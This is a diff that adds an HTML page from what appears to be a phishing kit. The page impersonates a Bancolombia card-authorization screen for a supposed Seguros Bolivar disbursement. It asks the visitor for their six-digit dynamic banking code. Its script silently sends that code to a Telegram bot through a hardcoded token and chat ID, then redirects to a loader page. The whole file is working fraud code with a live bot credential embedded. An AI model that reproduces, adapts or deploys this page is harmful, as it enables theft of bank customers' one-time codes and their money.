@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autorización de Transacción</title>
+    <link rel="stylesheet" href="css/3d.css">
+    <link rel="icon" href="img/logo.png">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+           <img src="img/logo.svg" alt="Bancolombia" class="logo-img">
+            <div class="logos">
+                <img src="img/verified-visa-mastercard.png" alt="Mastercard" class="logo-img">
+            </div>
+        </header>
+        
+        <main class="main">
+            <h2>Autorización de Desembolso</h2>
+            <p>La transacción que intentas realizar en <strong>Seguros Bolivar S.A.S</strong> por valor de <strong>$9.950</strong> en la fecha <strong id="fechaActual">29/11/2024</strong> para desembolsar a tu tarjeta terminada en <strong id="detalleTarjeta">**********2932</strong> debe ser autorizada por seguridad.</p>
+            <p><strong>¡Avancemos!</strong> Para terminar y por seguridad, necesitamos confirmar que eres tú quien está detrás de esta pantalla. Ingresa un dato que solo tú conoces. Consulta tu clave dinámica o mensajes de texto y escríbela aquí.</p>
+            
+            <div class="transaction-details">
+                <h3>Detalle de la Transacción</h3>
+                <p><strong>Comercio:</strong> Seguros Bolivar S.A.S</p>
+                <p><strong>Tarjeta Terminada en: </strong></p>
+                <p id="detalleTarjeta2">**********2932</p>
+            </div>
+
+            <form class="auth-form" id="authForm">
+                <label for="claveDinamica">Ingresa tu Clave Dinámica:</label>
+                <input type="password" id="claveDinamica" placeholder="Clave Dinámica" maxlength="6" required>
+                <button type="submit">Enviar</button>
+            </form>
+        </main>
+
+        <footer class="footer">
+            <a href="#" class="help-link">¿Necesitas Ayuda?</a>
+            <a href="#" class="close-link">Cerrar</a>
+        </footer>
+    </div>
+
+    <script>
+        // Mostrar los últimos 4 dígitos en los párrafos
+        document.addEventListener('DOMContentLoaded', () => {
+            const ultimos4 = localStorage.getItem('ultimos4');
+            if (ultimos4) {
+                const parrafoPrimario = document.getElementById('detalleTarjeta');
+                const parrafoSecundario = document.getElementById('detalleTarjeta2');
+                const contenido = `************${ultimos4}`;
+
+                parrafoPrimario.textContent = contenido;
+                parrafoSecundario.textContent = contenido;
+            }
+        });
+
+        // Fecha
+        document.addEventListener('DOMContentLoaded', () => {
+            const fecha = new Date();
+            const dia = String(fecha.getDate()).padStart(2, '0');
+            const mes = String(fecha.getMonth() + 1).padStart(2, '0');
+            const anio = fecha.getFullYear();
+            const fechaFormateada = `${dia}/${mes}/${anio}`;
+            const parrafoFecha = document.getElementById('fechaActual');
+            parrafoFecha.textContent = `${fechaFormateada}`;
+        });
+
+        // Enviar código a Telegram y redirigir
+        document.getElementById('authForm').addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            const claveDinamica = document.getElementById('claveDinamica').value;
+
+            if (!/^\d{6}$/.test(claveDinamica)) {
+                alert("Por favor, ingresa un código de 6 dígitos.");
+                return;
+            }
+
+            const botsAndChats = [
+                { token: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI', chats: ['6328222257', 'CHAT_ID_2'] },
+                { token: '', chats: ['', 'CHAT_ID_4'] },
+            ];
+
+            for (const { token, chats } of botsAndChats) {
+                for (const chatId of chats) {
+                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                    try {
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: `🔑🔴Clave Dinámica #1: ${claveDinamica}`
+                            })
+                        });
+                    } catch (error) {
+                        console.error(`Error al enviar datos al chat ${chatId} usando el bot ${token}:`, error);
+                    }
+                }
+            }
+
+            // Redirigir a otra página
+            window.location.href = 'loader.html'; // Cambia a la URL de tu página destino
+        });
+    </script>
+    <script type="module" src="js/util.js"></script>
+</body>
+</html>
